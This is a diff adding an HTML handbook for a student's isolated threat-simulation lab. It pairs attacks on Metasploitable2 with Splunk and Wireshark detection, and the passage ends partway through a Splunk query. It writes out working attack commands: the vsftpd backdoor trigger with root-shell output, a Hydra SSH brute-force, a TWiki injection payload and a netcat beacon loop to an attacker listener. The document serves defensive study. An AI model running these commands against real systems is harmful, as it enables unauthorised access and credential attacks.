@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+  @page { margin: 2.2cm 1.8cm; }
+  body { font-family: 'Helvetica Neue', Arial, sans-serif; color: #1a1a1a; line-height: 1.55; font-size: 11pt; }
+  h1 { color: #0d1b2a; font-size: 24pt; border-bottom: 3px solid #1b4965; padding-bottom: 8px; margin-top: 0; }
+  h2 { color: #1b4965; font-size: 17pt; border-bottom: 1px solid #ccc; padding-bottom: 4px; margin-top: 34px; }
+  h3 { color: #2c5f7c; font-size: 13.5pt; margin-top: 22px; }
+  h4 { color: #333; font-size: 11.5pt; margin-top: 16px; }
+  .cover { text-align: center; padding-top: 20%; page-break-after: always; }
+  .cover h1 { border: none; font-size: 30pt; }
+  .cover .subtitle { font-size: 14pt; color: #555; margin-top: 10px; }
+  .cover .meta { margin-top: 60px; font-size: 11pt; color: #444; }
+  .badge { display: inline-block; padding: 3px 10px; border-radius: 3px; font-size: 9pt; font-weight: bold; color: white; margin: 2px; }
+  .badge-green { background: #2e7d32; }
+  .badge-blue { background: #1565c0; }
+  .scenario-break { page-break-before: always; }
+  table { border-collapse: collapse; width: 100%; margin: 12px 0; font-size: 10pt; }
+  th, td { border: 1px solid #bbb; padding: 6px 9px; text-align: left; vertical-align: top; }
+  th { background: #1b4965; color: white; }
+  tr:nth-child(even) { background: #f4f7f9; }
+  code, pre { font-family: 'Courier New', monospace; }
+  pre { background: #1e1e1e; color: #d4d4d4; padding: 12px; border-radius: 4px; font-size: 9pt; overflow-wrap: break-word; white-space: pre-wrap; }
+  code { background: #eee; padding: 1px 5px; border-radius: 3px; font-size: 9.5pt; }
+  .figure { text-align: center; margin: 18px 0; page-break-inside: avoid; }
+  .figure img { max-width: 92%; border: 1px solid #999; border-radius: 4px; }
+  .figure .caption { font-size: 9.5pt; color: #555; margin-top: 6px; font-style: italic; }
+  .callout { background: #fff8e1; border-left: 4px solid #f9a825; padding: 10px 14px; margin: 14px 0; font-size: 10pt; }
+  .callout-red { background: #fdecea; border-left: 4px solid #c62828; }
+  .callout-blue { background: #e8f0fe; border-left: 4px solid #1565c0; }
+  .toc { page-break-after: always; }
+  .toc ul { list-style: none; padding-left: 0; }
+  .toc li { padding: 5px 0; border-bottom: 1px dotted #ccc; }
+  .toc .toc-l2 { padding-left: 24px; font-size: 10pt; color: #444; }
+  .status-complete { color: #2e7d32; font-weight: bold; }
+  .status-pending { color: #b26a00; font-weight: bold; }
+  footer-note { font-size: 8.5pt; color: #999; }
+</style>
+</head>
+<body>
+
+<div class="cover">
+  <h1>Network Threat Simulation<br/>and Incident Validation Lab</h1>
+  <div class="subtitle">Complete Project Handbook</div>
+  <div class="subtitle">Detection Engineering · Incident Investigation · Packet-Level Validation</div>
+  <div class="meta">
+    <p><strong>Author:</strong> Rithika Gowdelli</p>
+    <p>M.S. Cybersecurity, University of Houston</p>
+    <p>CompTIA Security+ &middot; EC-Council EHE, NDE, Cybersecurity Attack and Defense Fundamentals &middot; WiCyS Member</p>
+    <p style="margin-top:30px;">
+      <span class="badge badge-green">4 / 4 Scenarios Complete</span>
+      <span class="badge badge-blue">Splunk Enterprise</span>
+      <span class="badge badge-blue">Wireshark</span>
+    </p>
+  </div>
+</div>
+
+<div class="toc">
+<h1>Table of Contents</h1>
+<ul>
+  <li><strong>1. Executive Overview</strong></li>
+  <li class="toc-l2">1.1 Why This Project Exists</li>
+  <li class="toc-l2">1.2 Objectives</li>
+  <li class="toc-l2">1.3 Lab Architecture</li>
+  <li class="toc-l2">1.4 Technologies and Skills</li>
+  <li><strong>2. Scenario 1 — Network Reconnaissance and Port Scanning</strong></li>
+  <li><strong>3. Scenario 2 — Repeated SSH Authentication Failures</strong></li>
+  <li><strong>4. Scenario 3 — Suspicious HTTP Path Enumeration</strong></li>
+  <li><strong>5. Scenario 4 — Controlled Periodic Outbound Beacon</strong></li>
+  <li><strong>6. Failures, Troubleshooting, and How They Were Resolved</strong></li>
+  <li><strong>7. Detection Engineering Reference</strong></li>
+  <li><strong>8. Consolidated Incident Report — INC-001</strong></li>
+  <li><strong>9. MITRE ATT&amp;CK Summary</strong></li>
+  <li><strong>10. Lessons Learned</strong></li>
+  <li><strong>11. Future Improvements</strong></li>
+</ul>
+</div>
+
+<h1>1. Executive Overview</h1>
+
+<h2>1.1 Why This Project Exists</h2>
+<p>Most SOC analyst portfolios show tools. This one shows workflow: generate an event, catch it in logs, prove it happened at the packet level, write the detection query, tune it, and document the finding the way an analyst would write it up for a shift handoff. Every number in this handbook — every packet count, every failed login, every timing interval — was independently verified across at least two data sources (log data and raw packet capture) before being recorded as a finding.</p>
+<p>All activity documented here was generated inside a private, fully isolated virtual network against systems owned and controlled by the author. No public systems, real organizations, or third-party infrastructure were involved at any point.</p>
+
+<h2>1.2 Objectives</h2>
+<ul>
+  <li>Simulate four distinct, realistic attack techniques against an intentionally vulnerable target in a fully isolated lab</li>
+  <li>Detect and validate each technique using both a SIEM (Splunk) and independent packet-level analysis (Wireshark)</li>
+  <li>Build and tune real, working detection queries rather than relying on copy-pasted examples</li>
+  <li>Map every confirmed finding to the MITRE ATT&amp;CK framework</li>
+  <li>Document each investigation to the standard of a real incident report, including negative findings and troubleshooting narratives</li>
+  <li>Draft remediation recommendations grounded in the actual technical root cause of each finding</li>
+</ul>
+
+<h2>1.3 Lab Architecture</h2>
+<table>
+  <tr><th>Component</th><th>Role</th><th>Details</th></tr>
+  <tr><td>Kali Linux</td><td>Attacker platform / Wireshark capture point</td><td>Kali Rolling 2026.1 &middot; 192.168.50.10 (eth0, labnet) &middot; IP resets on reboot, manually re-added each session</td></tr>
+  <tr><td>Metasploitable2</td><td>Intentionally vulnerable target</td><td>Ubuntu 8.04 &middot; 192.168.50.20 (eth0, labnet) / 192.168.56.20 (eth1, host-only, reaches Splunk)</td></tr>
+  <tr><td>Windows Host</td><td>Splunk deployment</td><td>Splunk Enterprise (60-day trial), accessed via browser, not part of the isolated labnet segment</td></tr>
+  <tr><td>Network mode</td><td>Isolation boundary</td><td>VirtualBox Internal Network ("labnet") &mdash; no bridged adapter, no NAT, no internet access</td></tr>
+</table>
+
+<div class="callout">
+<strong>Design rationale:</strong> This lab uses a fully isolated VirtualBox internal network with no internet access or bridge to the host adapter, ensuring that every attack technique simulated here stays entirely contained. Metasploitable2 was chosen as the target because it is intentionally built with known, well-documented vulnerabilities, making it possible to generate realistic, reproducible findings without needing to discover novel vulnerabilities. Splunk Enterprise was used as the SIEM because it is one of the most widely deployed detection platforms in real SOC environments.
+</div>
+
+<h2>1.4 Technologies and Skills Demonstrated</h2>
+<table>
+  <tr><th>Category</th><th>Tools / Skills</th></tr>
+  <tr><td>Virtualization</td><td>VirtualBox (Internal Network mode)</td></tr>
+  <tr><td>Attacker OS</td><td>Kali Linux Rolling 2026.1</td></tr>
+  <tr><td>Target OS</td><td>Metasploitable2 (Ubuntu 8.04)</td></tr>
+  <tr><td>SIEM</td><td>Splunk Enterprise &mdash; SPL query writing, manual field extraction, alerting</td></tr>
+  <tr><td>Packet Analysis</td><td>Wireshark &mdash; display filters, protocol analysis, cross-source validation</td></tr>
+  <tr><td>Attack Simulation</td><td>Nmap, Gobuster, Hydra, Netcat</td></tr>
+  <tr><td>Detection Engineering</td><td>SPL, Sigma rule authoring, threshold tuning rationale</td></tr>
+  <tr><td>Analytical Skills</td><td>MITRE ATT&amp;CK mapping, true/false positive assessment, incident report writing, root cause analysis</td></tr>
+</table>
+
+<div class="scenario-break"></div>
+<h1>2. Scenario 1 — Network Reconnaissance and Port Scanning</h1>
+<p><span class="status-complete">STATUS: COMPLETE</span> &middot; MITRE ATT&amp;CK: T1595 (Active Scanning), T1046 (Network Service Discovery)</p>
+
+<h3>Objective</h3>
+<p>Simulate an attacker's initial reconnaissance phase by scanning the isolated target (Metasploitable2) from Kali Linux, then detect and validate that activity using Wireshark, and map it to MITRE ATT&amp;CK.</p>
+
+<h3>Prerequisites</h3>
+<ul>
+  <li>Kali Linux and Metasploitable2 powered on and reachable over the "labnet" internal network only</li>
+  <li>Static IPs confirmed on both machines (Kali IP resets on reboot — re-set before starting)</li>
+  <li>Wireshark capture running on the labnet interface before the scan starts, not after</li>
+  <li>Nmap installed on Kali</li>
+</ul>
+
+<h3>Procedure</h3>
+<ol>
+  <li>Wireshark capture started on eth0 (labnet interface).</li>
+  <li>Combined TCP connect and service/version scan run from Kali (192.168.50.10) against Metasploitable2 (192.168.50.20):</li>
+</ol>
+<pre>nmap -sT -sV 192.168.50.20</pre>
+<ol start="3"><li>Capture stopped after scan completion and saved as <code>scenario1-portscan.pcapng</code>.</li></ol>
+
+<h4>Full Command Output</h4>
+<pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-18 19:38 -0400
+Nmap scan report for 192.168.50.20
+Host is up (0.00071s latency).
+Not shown: 977 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  shell       Netkit rshd
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 08:00:27:B9:CA:24 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds</pre>
+
+<div class="callout">
+<strong>Notable finding:</strong> three services are known-backdoored by design on Metasploitable2 — port 21 (vsftpd 2.3.4, CVE-2011-2523, confirmed exploitable below), port 6667 (UnrealIRCd, CVE-2010-2075), and port 1524 (a root shell already listening, no exploitation required at all).
+</div>
+
+<div class="figure">
+  <img src="evidence/scenario-01/01-nmap-scan-output-part1.png"/>
+  <div class="caption">Figure 2.1 — Nmap scan output, part 1: initial scan launch and early port results.</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-01/02-nmap-scan-output-part2.png"/>
+  <div class="caption">Figure 2.2 — Nmap scan output, part 2: remaining open ports and scan completion (15.32 seconds, 23 open ports).</div>
+</div>
+
+<h3>vsftpd 2.3.4 Backdoor Confirmation (CVE-2011-2523)</h3>
+<p>Tested directly from Kali against the target's FTP service (port 21) using the documented trigger method: sending a username containing the string <code>:)</code>, followed by a connection attempt to port 6200.</p>
+<pre>ftp 192.168.50.20
+Name: rithika:)
+Password: [any value, login itself fails/is irrelevant]</pre>
+<pre>nc 192.168.50.20 6200</pre>
+<p><strong>Result across four attempts:</strong> three returned <code>Connection refused</code>; the fourth succeeded, dropping directly into a shell with no authentication prompt:</p>
+<pre>whoami
+root
+hostname
+metasploitable
+id
+uid=0(root) gid=0(root)</pre>
+<p>This confirms full, unauthenticated root access on the target via this backdoor. The inconsistency across attempts (3 failures, 1 success) suggests the malicious code path is timing-sensitive rather than unreliable by design.</p>
+
+<div class="figure">
+  <img src="evidence/scenario-01/04-KEY-exploit-success-whoami-root.png"/>
+  <div class="caption">Figure 2.3 — Successful exploitation: <code>whoami</code> returns <code>root</code>, confirming unauthenticated root shell access via the vsftpd backdoor.</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-01/05-KEY-exploit-confirmed-hostname-id.png"/>
+  <div class="caption">Figure 2.4 — Further confirmation: <code>hostname</code> and <code>id</code> commands confirming root-level access (uid=0) on the target machine.</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-01/03-wireshark-syn-filter-validation.png"/>
+  <div class="caption">Figure 2.5 — Wireshark validation using filter <code>ip.addr==192.168.50.20 &amp;&amp; tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0</code>, confirming the SYN packet burst matching the Nmap scan.</div>
+</div>
+
+<h3>Investigation Questions</h3>
+<table>
+  <tr><th>Question</th><th>Answer</th></tr>
+  <tr><td>What is the earliest indicator that a scan is occurring?</td><td>The Wireshark capture is the defender-side indicator — a burst of SYN packets from 192.168.50.10 to 192.168.50.20 across many destination ports within the 15.32-second window.</td></tr>
+  <tr><td>How many unique ports were touched, and over what time window?</td><td>Nmap's default top-1000-port list was probed (23 came back open, 977 closed) in 15.32 seconds — roughly 65 ports per second.</td></tr>
+  <tr><td>Does the scan pattern in Wireshark match what Nmap reported?</td><td>Confirmed. The filter shows a burst of SYN packets starting roughly 2.6 seconds into the capture, hitting a wide, non-sequential spread of destination ports — consistent with Nmap's default port-randomization behavior.</td></tr>
+  <tr><td>Would this scan pattern be distinguishable from a legitimate service discovery tool?</td><td><code>-sT</code> is a full TCP connect scan, by design harder to distinguish from a normal application connecting than a stealth <code>-sS</code> scan. The distinguishing signal is volume and speed — 65 ports/sec against nearly every well-known port in 15 seconds is not normal client behavior.</td></tr>
+</table>
+
+<h3>Indicators of Compromise</h3>
+<table>
+  <tr><th>Type</th><th>Value</th><th>Notes</th></tr>
+  <tr><td>Source IP</td><td>192.168.50.10</td><td>Kali attacker IP</td></tr>
+  <tr><td>Scan pattern</td><td>1000 ports probed, 23 open / 977 closed, 15.32 seconds (~65 ports/sec)</td><td>TCP connect scan (-sT), full three-way handshake per port</td></tr>
+  <tr><td>Exposed backdoored services</td><td>vsftpd 2.3.4 (port 21), UnrealIRCd (port 6667), root bindshell (port 1524)</td><td>Pre-existing on Metasploitable2, discovered by the scan</td></tr>
+</table>
+
+<h3>True Positive / False Positive Assessment</h3>
+<p>True positive by design — this was a deliberate, controlled scan run by the lab operator. In a real environment, this would be distinguished from a false positive (e.g. a scheduled internal vulnerability scanner like Nessus or Qualys) by checking whether the source IP is on an approved scanner allowlist and whether the timing matches a known scan schedule.</p>
+
+<h3>Splunk Correlation — Scope Note</h3>
+<p>Splunk correlation was not pursued for this scenario. Metasploitable2 does not log incoming connection attempts by default, and no additional log source was introduced to capture this activity. Detection and validation for this scenario relied on Wireshark packet-level analysis and direct Nmap output, which together provide sufficient evidence for the finding. The Splunk/SIEM detection skillset is demonstrated in Scenarios 2 and 4.</p>
+
+<h3>Remediation Recommendations</h3>
+<p class="status-pending">Pending final write-up.</p>
+
+<div class="scenario-break"></div>
+<h1>3. Scenario 2 — Repeated SSH Authentication Failures</h1>
+<p><span class="status-complete">STATUS: COMPLETE</span> &middot; MITRE ATT&amp;CK: T1110.001 (Brute Force: Password Guessing), T1021.004 (Remote Services: SSH)</p>
+
+<h3>Objective</h3>
+<p>Simulate a brute-force authentication attack against SSH, detect it in Splunk using a volume-based threshold query, and independently validate the finding at the packet level using Wireshark — a distinct detection method from Scenario 4's timing-based approach.</p>
+
+<h3>Procedure</h3>
+<ol>
+  <li>New Splunk Enterprise trial instance provisioned (60-day trial) after the original Splunk account expired and its previously ingested data was lost.</li>
+  <li>Brute-force login attack run from Kali against Metasploitable2:</li>
+</ol>
+<pre>hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.20</pre>
+<ol start="3">
+  <li>Failed login attempts logged automatically by the target's own SSH daemon into <code>/var/log/auth.log</code>.</li>
+  <li>Filtered log saved as <code>attack_sample3.log</code> and uploaded into Splunk via Add Data &rarr; Upload, with sourcetype manually set to <code>linux_secure</code> (auto-detection did not select this correctly).</li>
+  <li>Data ingestion confirmed with a basic search (<code>index=main sourcetype=linux_secure</code>) before building any detection logic — 1,698 events landed, closely matching the 1,694 failed attempts recorded in the original attack.</li>
+  <li>A short live re-run of the same Hydra command was separately captured in Wireshark on Kali's eth0 interface to independently validate the attack at the network/packet level.</li>
+</ol>
+
+<h3>Working SPL Query</h3>
+<pre>index=main sourcetype=linux_secure "Failed password"
+| rex field=_raw "from (?&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+)"
+| bin _time span=5m
+| stats count by src_ip, _time
+| where count &gt; 5</pre>
+<p><strong>Result:</strong> 2 rows returned, both from source IP 192.168.50.10 — 1,041 failures in one 5-minute bin, 653 failures in the following bin. Total: 1,694, matching the original attack count exactly. Both bins are far above the &gt;5 threshold, correctly flagging the activity as brute-force behavior.</p>
+
+<div class="figure">
+  <img src="evidence/scenario-02/02-raw-events-list-1698-total.png"/>
+  <div class="caption">Figure 3.1 — Raw ingested events in Splunk: 1,698 events confirmed landed, matching the expected auth log volume.</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-02/03-raw-event-expanded-fields.png"/>
+  <div class="caption">Figure 3.2 — A single expanded raw event, confirming log format (<code>Failed password for msfadmin from 192.168.50.10</code>) and sourcetype parsing.</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-02/01-KEY-spl-query-1041-653-results.png"/>
+  <div class="caption">Figure 3.3 — The working SPL detection query and its results: two threshold-breaching bins (1,041 + 653 = 1,694 failures), both from source IP 192.168.50.10.</div>
+</div>
+
+<h3>Alert Configuration</h3>
+<p>An alert named "SSH Brute Force Detection" was built on this query, with trigger condition "Number of Results &gt; 0" and a trigger action (Add to Triggered Alerts). The first save attempt failed with the error "enable at least one action" — resolved by adding a trigger action before saving again.</p>
+
+<div class="figure">
+  <img src="evidence/scenario-02/04-KEY-alert-saved-enabled.png"/>
+  <div class="caption">Figure 3.4 — Alert "SSH Brute Force Detection" saved and enabled successfully, confirmed by the green "Enabled" status.</div>
+</div>
+
+<h3>Wireshark Validation</h3>
+<p>Filter applied: <code>ip.addr==192.168.50.20 &amp;&amp; tcp.port==22</code>. Since SSH traffic is encrypted, this validates connection volume and timing rather than credential content — the capture shows repeated SSHv2 Key Exchange Init / Diffie-Hellman handshake sequences followed by RST packets, the packet-level signature of automated brute forcing.</p>
+<p><strong>Result:</strong> 1,679 packets matched the filter out of 1,683 total captured (99.8% displayed, 0% dropped) — closely matching the 1,694 failed attempts recorded in the auth log, independently confirming the same event at the network level.</p>
+
+<div class="figure">
+  <img src="evidence/scenario-02/05-KEY-wireshark-1679-packets-confirmed.png"/>
+  <div class="caption">Figure 3.5 — Wireshark capture confirming 1,679 packets matching the SSH filter, cross-validating the Splunk-based finding.</div>
+</div>
+
+<h3>Investigation Questions</h3>
+<table>
+  <tr><th>Question</th><th>Answer</th></tr>
+  <tr><td>What is the time gap between individual failed attempts?</td><td>Attempts land within fractions of a second of each other (multiple SSH handshakes within a 0.03-second window), consistent with automated tooling.</td></tr>
+  <tr><td>Single username or many?</td><td>Single username (msfadmin) tried repeatedly — a targeted brute force, not credential stuffing.</td></tr>
+  <tr><td>Did the attack culminate in a successful login?</td><td>Not tested or confirmed in this scenario. Scope was detection and validation of failed-login volume rather than achieving a successful compromise.</td></tr>
+  <tr><td>How does the threshold hold up against normal user behavior?</td><td>&gt;5 failures/5 minutes is well above what a legitimate user mistyping a password would generate (typically 1&ndash;3 attempts), keeping false-positive risk low.</td></tr>
+  <tr><td>Observation worth flagging</td><td>The ingested log file contained events spanning more than one calendar day (July 4 and July 5) — likely reflecting multiple attack runs concatenated into one log file.</td></tr>
+</table>
+
+<h3>MITRE ATT&amp;CK Mapping</h3>
+<table>
+  <tr><th>Technique</th><th>Name</th><th>Justification</th></tr>
+  <tr><td>T1110.001</td><td>Brute Force: Password Guessing</td><td>Hydra systematically tried a leaked password list against a single known username via SSH</td></tr>
+  <tr><td>T1021.004</td><td>Remote Services: SSH</td><td>The targeted service was SSH remote login</td></tr>
+</table>
+
+<h3>Remediation Recommendations</h3>
+<p><strong>Problem:</strong> During testing, SSH on the target machine allowed unlimited login attempts with no lockout or blocking mechanism in place. This let Hydra attempt 1,694 passwords in roughly 10 minutes without the system pushing back or slowing down.</p>
+<p><strong>Why it matters:</strong> If the target password had been weak instead of strong, this lack of protection would have let an attacker brute-force the password, log in, and gain root access. This is a realistic risk because free, widely available tools like Hydra require minimal skill to use, and combined with leaked password lists, make this attack trivial to carry out against any system without login protections.</p>
+<p><strong>Fix:</strong> Implement fail2ban, a tool that monitors authentication logs and automatically blocks an IP address after it exceeds a failure threshold — for example, more than 5 failed login attempts within a 5-minute window, matching the detection logic used in this investigation. This adds a second layer of defense so security doesn't depend entirely on password strength alone.</p>
+
+<div class="scenario-break"></div>
+<h1>4. Scenario 3 — Suspicious HTTP Path Enumeration</h1>
+<p><span class="status-complete">STATUS: COMPLETE</span> &middot; MITRE ATT&amp;CK: T1595.003 (Wordlist Scanning), T1592 (Gather Victim Host Information)</p>
+
+<h3>Objective</h3>
+<p>Simulate an attacker enumerating web application paths and directories on Metasploitable2's web service, validate at the packet level in Wireshark, and map the finding to MITRE ATT&amp;CK.</p>
+
+<div class="callout callout-red">
+<strong>Troubleshooting note:</strong> during this scenario, an IP conflict occurred after VM reboot — Kali was accidentally assigned 192.168.50.20 (the same IP as the target) instead of its correct 192.168.50.10. This caused <code>ping</code> to falsely appear successful (Kali was pinging itself) while curl/HTTP failed outright. Diagnosed via <code>ip addr show | grep 192.168.50</code> and fixed with <code>ip addr del</code>/<code>ip addr add</code>. See Section 6 for full detail.
+</div>
+
+<h3>Procedure</h3>
+<ol>
+  <li>Wireshark capture started on eth0, no filter.</li>
+  <li>Gobuster directory enumeration run from Kali against the target's web server:</li>
+</ol>
+<pre>gobuster dir -u http://192.168.50.20 -w /usr/share/wordlists/dirb/common.txt</pre>
+<ol start="3"><li>Capture stopped after scan completion, saved as <code>scenario3-httpenum-v2.pcapng</code>.</li></ol>
+
+<h4>Full Command Output</h4>
+<pre>Gobuster v3.8.2
+[+] Url:                     http://192.168.50.20
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+
+.htaccess            (Status: 403) [Size: 295]
+.htpasswd            (Status: 403) [Size: 295]
+cgi-bin/             (Status: 403) [Size: 294]
+dav                  (Status: 301) [Size: 317] [--&gt; http://192.168.50.20/dav/]
+index.php            (Status: 200) [Size: 891]
+phpinfo.php          (Status: 200) [Size: 48011]
+phpMyAdmin           (Status: 301) [Size: 324] [--&gt; http://192.168.50.20/phpMyAdmin/]
+server-status         (Status: 403) [Size: 299]
+test                 (Status: 301) [Size: 318] [--&gt; http://192.168.50.20/test/]
+twiki                (Status: 301) [Size: 319] [--&gt; http://192.168.50.20/twiki/]
+Progress: 4613 / 4613 (100.00%)
+
+Finished</pre>
+
+<h3>Wireshark Validation</h3>
+<p>Filter applied: <code>http.request &amp;&amp; ip.addr == 192.168.50.20</code>. Result: 4,615 displayed HTTP requests, matching Gobuster's 4,613 wordlist entries (small overhead from initial handshake/setup traffic). Confirmed no response packets were counted by checking individual paths.</p>
+
+<div class="figure">
+  <img src="evidence/scenario-03/01-gobuster-output-part1.png"/>
+  <div class="caption">Figure 4.1 — Gobuster enumeration output, part 1.</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-03/02-gobuster-output-part2.png"/>
+  <div class="caption">Figure 4.2 — Gobuster enumeration output, part 2, showing completion at 4,613/4,613 paths.</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-03/03-KEY-4615-requests-confirmed.png"/>
+  <div class="caption">Figure 4.3 — Wireshark confirming 4,615 displayed HTTP requests, matching Gobuster's enumeration.</div>
+</div>
+
+<h3>Finding 1 — phpinfo.php Information Disclosure (CONFIRMED)</h3>
+<p>No exploitation required — this page is publicly viewable by design and dumps the server's full PHP configuration.</p>
+<pre>curl http://192.168.50.20/phpinfo.php</pre>
+<table>
+  <tr><th>Detail</th><th>Value</th><th>Why it matters</th></tr>
+  <tr><td>PHP version</td><td>5.2.4-2ubuntu5.10</td><td>Over 15 years out of date; multiple known CVEs</td></tr>
+  <tr><td>Web server</td><td>Apache/2.2.8 (Ubuntu) DAV/2</td><td>Independently confirms the Nmap fingerprint from Scenario 1</td></tr>
+  <tr><td>Document root</td><td>/var/www/</td><td>Exact filesystem location, useful if file read/write vulnerability found</td></tr>
+  <tr><td>PHP config path</td><td>/etc/php5/cgi/php.ini</td><td>Exact configuration file location</td></tr>
+  <tr><td>MySQL client</td><td>5.0.51a</td><td>Tells an attacker exactly which MySQL-side vulnerabilities might apply</td></tr>
+</table>
+
+<h3>Finding 2 — phpMyAdmin Default Credentials (NEGATIVE)</h3>
+<p>Confirmed reachable via header check (HTTP 200, valid session cookies, <code>Last-Modified: Tue, 09 Dec 2008</code> header confirming this install is contemporaneous with the rest of the outdated software on this box). Credential testing attempted: <code>root</code>/blank, <code>root</code>/<code>root</code>, <code>root</code>/<code>msfadmin</code>, <code>msfadmin</code>/<code>msfadmin</code>. All four attempts returned "Access denied" — confirmed negative finding.</p>
+
+<div class="figure">
+  <img src="evidence/scenario-03/06-phpmyadmin-headers-confirmed.png"/>
+  <div class="caption">Figure 4.4 — phpMyAdmin header check confirming the install is reachable and dated to 2008, consistent with the rest of the outdated software stack.</div>
+</div>
+
+<h3>Finding 3 — TWiki Command Injection, CVE-2004-2649 (NEGATIVE)</h3>
+<p>Confirmed the TWiki install is genuinely a 2003-era build (revision r1.20 in page footer). Command injection tested via the <code>search</code> parameter in <code>bin/search</code>:</p>
+<pre>curl "http://192.168.50.20/twiki/bin/search/Main/?scope=text;regex=on;search=';`echo HELLO_FROM_TWIKI`;'"</pre>
+<p><strong>Result:</strong> the payload was returned as literal, unexecuted search text. No command execution occurred — confirmed negative result.</p>
+
+<div class="figure">
+  <img src="evidence/scenario-03/04-twiki-revision-2003-confirmed.png"/>
+  <div class="caption">Figure 4.5 — TWiki page footer confirming the genuinely outdated 2003-era installation (revision r1.20).</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-03/05-KEY-twiki-injection-negative-result.png"/>
+  <div class="caption">Figure 4.6 — TWiki command injection test: payload returned as literal text, confirming no code execution occurred.</div>
+</div>
+
+<h3>Remediation Recommendations</h3>
+<p><strong>Finding 1 (phpinfo.php):</strong> Remove phpinfo.php entirely from the production web server. If similar diagnostic info is needed, restrict it to internal-only access via firewall rule or IP allowlist.</p>
+<p><strong>Finding 2 (phpMyAdmin):</strong> Restrict phpMyAdmin to internal-only access via a firewall rule allowing only trusted IPs, and enable account lockout after a small number of failed attempts.</p>
+<p><strong>Finding 3 (TWiki):</strong> If TWiki isn't needed, remove it entirely. If required, upgrade to a current, supported version, and restrict access via firewall rule while the upgrade is scheduled.</p>
+
+<h3>Splunk Correlation — Scope Note</h3>
+<p>No Apache access log was ingested into Splunk for this scenario. Detection and validation relied on Gobuster's own output cross-validated against Wireshark's HTTP request count. The Splunk/SIEM detection skillset is demonstrated in Scenarios 2 and 4.</p>
+
+<div class="scenario-break"></div>
+<h1>5. Scenario 4 — Controlled Periodic Outbound Beacon</h1>
+<p><span class="status-complete">STATUS: COMPLETE</span> &middot; MITRE ATT&amp;CK: T1071 (Application Layer Protocol), T1571 (Non-Standard Port)</p>
+
+<h3>Objective</h3>
+<p>Simulate a compromised host generating periodic outbound "beacon" traffic back to an attacker-controlled listener, and detect the underlying timing pattern using Wireshark and Splunk. Unlike Scenario 2 (volume-based detection), this scenario detects a threat by the <em>regularity of its timing</em> — a distinct, more advanced detection technique used to catch real malware beaconing.</p>
+
+<h3>Procedure</h3>
+<p><strong>Listener on Kali:</strong></p>
+<pre>nc -lvkp 4444</pre>
+<p><strong>Beacon loop on Metasploitable2</strong> (typed manually, one line):</p>
+<pre>while true; do echo beacon | nc -w 2 192.168.50.10 4444; sleep 30; done</pre>
+<p>Note: the original plan was to use <code>timeout 2</code>, but Metasploitable2's Ubuntu 8.04 base does not have <code>timeout</code> installed — <code>nc -w 2</code> (netcat's own built-in timeout) was used instead, achieving the same effect.</p>
+
+<h3>Wireshark Analysis</h3>
+<p>Filter: <code>ip.addr==192.168.50.20 &amp;&amp; tcp.port==4444</code>. 46 total packets captured, 28 matched. Two fully successful beacons at the start (full handshake + "beacon" payload delivered), followed by six later attempts refused (listener stopped accepting new connections) — but every attempt, successful or refused, occurred on the same ~30-second schedule.</p>
+
+<div class="figure">
+  <img src="evidence/scenario-04/03-KEY-wireshark-first-two-beacons-30sec-interval.png"/>
+  <div class="caption">Figure 5.1 — First two successful beacons: full TCP handshake and "beacon" payload delivery, 33.99 seconds apart.</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-04/04-KEY-wireshark-periodic-refused-connections.png"/>
+  <div class="caption">Figure 5.2 — Later connection attempts, refused by the listener but still landing exactly on the ~30-second schedule.</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-04/01-kali-listener-beacon-received.png"/>
+  <div class="caption">Figure 5.3 — Kali listener terminal showing received "beacon" messages and the listener-restart pattern.</div>
+</div>
+<div class="figure">
+  <img src="evidence/scenario-04/02-metasploitable-loop-connection-refused.png"/>
+  <div class="caption">Figure 5.4 — Metasploitable2 terminal showing the beacon loop running, the missing <code>timeout</code> binary, and subsequent "Connection refused" messages.</div>
+</div>
+
+<h3>Splunk Timing-Pattern Detection Query</h3>
+<pre>index=main source="scenario4-beacon-connections.csv" Info="*[SYN]*" extracted_Source="192.168.50.20"
+| table Time
+| sort Time
+| delta Time as gap_seconds
